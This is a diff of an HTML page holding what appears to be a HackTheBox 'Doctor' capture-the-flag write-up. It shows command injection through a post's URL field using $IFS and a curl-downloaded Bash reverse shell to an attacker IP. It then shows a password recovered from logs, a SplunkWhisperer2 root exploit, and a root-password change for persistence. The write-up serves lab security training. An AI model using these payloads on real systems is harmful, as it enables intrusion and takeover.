@@ -3,34 +3,38 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- iOS Safari -->
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
-  <meta name="theme-color" content="#FFFFFF">
-  <meta property="og:title" content="Doctor - 10.10.10.209">
-  
-  <meta name="description" content="A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder.">
-  <meta property="og:description" content="A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder.">
-  
-  <meta property="og:type" content="blog">
-  <title>Doctor - 10.10.10.209</title>
-  <!-- Favicon -->
-  
-  <link rel="shortcut icon" href="https://samillwong.github.io/images/profile.jpg">
-  
-  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
-  <link rel="stylesheet" type="text/css"
-    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
-  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
-  <link rel="stylesheet" type="text/css" href="css/notablog.css">
-  <link rel="stylesheet" type="text/css" href="css/theme.css">
-  <style>
-    :root {
-      font-size: 18px;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
 
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Doctor - HackTheBox Writeup (10.10.10.209)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Doctor - HackTheBox Writeup (10.10.10.209)">
+  
+    <meta name="description" content="A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder to gain root and persistence.">
+    <meta property="og:description" content="A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder to gain root and persistence.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/256280ee1fb4fd4d7610881c209a2b5e.png">
+  
+  <style>
     .DateTagBar {
       margin-top: 1.0rem;
     }
@@ -39,92 +43,99 @@
 
 <body>
   <nav class="Navbar">
-    <a href="/">
-      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://samillwong.github.io/images/profile.jpg"></span> <span>Home</span></div>
-    </a>
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-  </nav>
-  <header class="Header">
+  <a href="/">
+    <div class="Navbar__Btn">
       
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
     <div class="Header__Spacer Header__Spacer--NoCover">
     </div>
     
-    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/256280ee1fb4fd4d7610881c209a2b5e.png"></span></div>
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/256280ee1fb4fd4d7610881c209a2b5e.png"></span>
+      </div>
     
-    <h1 class="Header__Title">Doctor - 10.10.10.209</h1>
+    <h1 class="Header__Title">Doctor - HackTheBox Writeup (10.10.10.209)</h1>
+    
+      <div class="DateTagBar">
         
-    <div class="DateTagBar">
-          
-      <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Feb 27, 2021</span>
-          
-          
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
-          <a href="tag/Easy">Easy</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
-          <a href="tag/Linux">Linux</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
-          <a href="tag/Web_Application">Web Application</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
-          <a href="tag/Command_Injection">Command Injection</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
-          <a href="tag/Splunk_Forwarder">Splunk Forwarder</a>
-      </span>
-      
-    </div>
-    <div class="Article__Desc">
-        A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder.
-    </div>
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Feb 27, 2021</span>
         
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Web_Application">Web Application</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Command_Injection">Command Injection</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Splunk_Forwarder">Splunk Forwarder</a>
+          </span>
+        
+      </div>
+      <div>
+        A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder to gain root and persistence.
+      </div>
+    
   </header>
-      <article id="https://www.notion.so/e6ff9e4456b5480989efbadab0f5bea1" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/c215c7ebf3b54df181a21ad0df9f7aba" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/c215c7ebf3b54df181a21ad0df9f7aba"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/e50c6c5d4145437c81b072323e26a4ef" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/e62b886b52fd44b588c08647b10fa0e6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.209 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/a5e38a5cc9c240fb959ca9791c194799" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
+  <article id="https://www.notion.so/e6ff9e4456b5480989efbadab0f5bea1" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/c215c7ebf3b54df181a21ad0df9f7aba" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/c215c7ebf3b54df181a21ad0df9f7aba"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/e50c6c5d4145437c81b072323e26a4ef" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/e62b886b52fd44b588c08647b10fa0e6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.209 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/a5e38a5cc9c240fb959ca9791c194799" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 8089/tcp open  unknown</span></span></span></code></pre></li><li id="https://www.notion.so/e73f7b192a1f4f56856cf091d0718766" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/35137173e24f43cbaa894af85597d0d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p 22,80,8089 -sC -sV 10.10.10.209 &gt; scan.nmap</code></span></span></p></div><pre id="https://www.notion.so/d91cd441971c4c22a6b1f8b480316c8c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE  VERSION
@@ -153,12 +164,10 @@ User-Agent: curl/7.68.0
 Accept: */*</span></span></span></code></pre></li><li id="https://www.notion.so/361a52d30105443f8252ec790a9b0929" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">There seems to be a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> agent running on the target which automatically GETs links on posts.</span></span></li><li id="https://www.notion.so/02e7c84e7c5d4e52820bc7bd1e4d8ca3" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">More importantly, it is executing the code that we injected in the URL, seeing as we got a request for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/web</code></span><span class="SemanticString"> back, where </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">web</code></span><span class="SemanticString"> is likely the username.</span></span></li><li id="https://www.notion.so/885aaf1fe382457aad3d2f5a49e09392" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Forward the request to Burp Suite to investigate this further, and we get:</span></span><div id="https://www.notion.so/595d10e0b7bd4c12b0c7c2b80f837a2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$(whoami)&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/29e8f02ef74b44a28518d4a4d1b4df9d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">And start a HTTP server locally to listen for requests:</span></span><div id="https://www.notion.so/75e5519c614c4781b2ef699f0333d417" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo python3 -m http.server 80</code></span></span></p></div></li><li id="https://www.notion.so/3aa9bd3d882449f98b373e777a804c97" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Let&#x27;s see if we can get an echo back:</span></span><div id="https://www.notion.so/6fa8847dd0ec4b81b3573e9db5833a7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$(echo test)&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/23c5cf5cefad478a8f772a444ca8e83b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">That didn&#x27;t work, neither did swapping out the whitespace with encoded characters like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">+</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">%20</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/6c674ad9adc8467b8aacf9c4fa7a3c61" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Let&#x27;s try using a bracket expansion:</span></span><div id="https://www.notion.so/f15a2d52b5db437aa3e7b7e84a9192c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$({echo,test})&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/3c91103e0fbb496a87dfd74971d678c1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">That didn&#x27;t work either. We can try to use something called the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$IFS</code></span><span class="SemanticString"> variable which returns a space, don&#x27;t forget to put things in quotes:</span></span><div id="https://www.notion.so/c46596753cf34a6382b72e91858eba56" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$(echo$IFS&#x27;test&#x27;)&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/208f7200ee3c47808caa77b416ef042b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We get a request for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/test</code></span><span class="SemanticString"> from the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> agent:</span></span><pre id="https://www.notion.so/ec3c49023e37479487ce66d863f01273" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&quot;GET /test HTTP/1.1&quot; 404</span></span></span></code></pre></li><li id="https://www.notion.so/7f57ee55f66c4e36ba819153dcffc1fe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Now that we have code execution, let&#x27;s try to upload and execute a reverse shell.</span></span></li><li id="https://www.notion.so/fccaeb405a764d498861d0a2a26a0f08" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create a simple Bash reverse shell </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rev</code></span><span class="SemanticString">, host the file on the HTTP server we have started earlier.:</span></span><pre id="https://www.notion.so/634ca7e3d68a4b50a2a71f9dab4e7a26" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token function">bash</span> -c <span class="token string">'bash -i &amp;> /dev/tcp/10.10.14.53/6969 0>&amp;1'</span></span></span></span></code></pre></li><li id="https://www.notion.so/0e50cb32fb4f4552a5fe7209fbaeecb8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Make the following request to have the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> agent download our reverse shell to the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/www/html/</code></span><span class="SemanticString"> directory:</span></span><div id="https://www.notion.so/569a394297874f72b50d2d3f92b8bdcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$(curl$IFS&#x27;-o&#x27;$IFS&#x27;/var/www/html/rev&#x27;$IFS&#x27;http://10.10.14.53/rev&#x27;)&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/0366a03935f148f1acb741e247679dd4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for a reverse connection:</span></span><div id="https://www.notion.so/1124e856a83947bd877bfd8f6d7878e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/98881dab0c00487aaee4631bc96c9a3e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Run our reverse shell by requesting:</span></span><div id="https://www.notion.so/3a77fd7862dc422b906b3046e91274b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">title=pwn&amp;content=http//10.10.14.53/$(bash$IFS&#x27;/var/www/html/rev&#x27;)&amp;submit=Post</code></span></span></p></div></li><li id="https://www.notion.so/8b8b6bad395744f0859cc1f6412013df" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We should now get a reverse shell as web:</span></span><div id="https://www.notion.so/1bee4c34ba9148d5af339de3a81ae589" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/fcf3abc570074d87927f88bfd3bc09d6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span></span></span></span></code></pre></li><li id="https://www.notion.so/6e8ebbb44d04408f9b1f331a8f61133c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We notice that the web user is in group </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">4(adm)</code></span><span class="SemanticString">, which grants us read access to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/log/</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/414e53dad08b4919b63ab0750f162d1f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">But before we proceed, let&#x27;s upgrade our shell by spawning a TTY:</span></span><div id="https://www.notion.so/62589c3c3c2647489cf2e71689580f27" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/shell.py</code></span></span></p></div><div id="https://www.notion.so/335d0866d5894b9b90da79809df8c196" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python3 /tmp/shell.py</code></span></span></p></div></li><li id="https://www.notion.so/6f103d800a4a4f68b4246bc8f8f334bf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigating to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/</code></span><span class="SemanticString">, we see that there is a user named shaun.</span></span></li><li id="https://www.notion.so/b79d07a6c260460885d18f707d2310b9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">While looking for log files, we see that there is a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backup</code></span><span class="SemanticString"> file in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/log/apache2</code></span><span class="SemanticString"> directory. Checking what&#x27;s inside:</span></span><div id="https://www.notion.so/9c82b7b043a44823946599ffd928b645" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat backup | grep pass</code></span></span></p></div><pre id="https://www.notion.so/b4c4cd6bfcbb4fd9b444199831e5c6b4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453</span></span></span></code></pre></li><li id="https://www.notion.so/5e3fe963a1a543cb8a9e937f1e7a703f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looks like some user mistakenly put their password in the email address field on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/reset_password</code></span><span class="SemanticString"> page, wonder if that was shaun...</span></span><div id="https://www.notion.so/8b6b28fadd864353a482827f012941c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">su shaun</code></span><span class="SemanticString">
 </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Guitar123</code></span></span></p></div></li><li id="https://www.notion.so/89df18a2ba6246b59ec2db6ba0d7f8e8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We&#x27;re in as shaun, let&#x27;s get the user flag!</span></span></li></ul><h2 id="https://www.notion.so/32b64bc04a1c4bd5b9d6a1839a47ad5d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/32b64bc04a1c4bd5b9d6a1839a47ad5d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/ec33e1b137b945bdbf43f876a5538945" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Password reuse in shaun&#x27;s Splunk account, granting us access to Splunk services on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://10.10.10.209:8089/services">https://10.10.10.209:8089/services</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/b65ed0605d9746d58d1aa917d669c240" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Splunk version info exposed on services page to be 8.0.5, which is vulnerable to an RCE attack.</span></span></li><li id="https://www.notion.so/c338dee360884868a61f77af5c4dfa17" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The attack is carried out by leveraging the agent&#x27;s credentials to create a malicious app bundle on the forwarder, such that we can inject arbitrary privileged code.</span></span></li><li id="https://www.notion.so/711ebf25aba94c2ba7c93c4df83c9e94" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can use an existing exploit called SplunkWhisperer2 (cnotin) to gain a reverse shell:</span></span><div id="https://www.notion.so/9ee09e971d2948b6ab52565ff3c207af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.53 --username shaun --password Guitar123 --payload &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9001 0&gt;&amp;1&#x27;&quot;</code></span></span></p></div></li><li id="https://www.notion.so/14d1fbc7d44b4a379cb5ad0cba9cf87e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">If the exploit ran successfully, we should see a reverse connection which will grant us a root shell:</span></span><div id="https://www.notion.so/790b70b23b234e1ca834a42cdc33be82" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/149f02af68b64e95aa31d8de62f08665" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre></li><li id="https://www.notion.so/dadad87b8bcd47c49929ed77ca116670" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/092e14f2bc2e4a95aaaa59fe90fe80e4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/092e14f2bc2e4a95aaaa59fe90fe80e4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/2095d4474af64f37ac893d52303bed14" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can also change the root password to maintain SSH access:</span></span><div id="https://www.notion.so/6f5419170ef945f8bd0edd68bf4fc2c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.53 --username shaun --password Guitar123 --payload &quot;echo &#x27;root:persistenceiskey&#x27; | changepw&quot;</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/191ef2747c5d4f15af59e6d5bd83f2ab" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/191ef2747c5d4f15af59e6d5bd83f2ab"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/aec4390a17e64a55b8bc43c4e4a2bbd3" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://bash.cyberciti.biz/guide/$IFS">https://bash.cyberciti.biz/guide/$IFS</a></span></span></li><li id="https://www.notion.so/d7f463bd6e0d474ea7175e6e20a75670" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></span></span></li><li id="https://www.notion.so/079da51c4c6a47ca985cc0be327369d1" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" 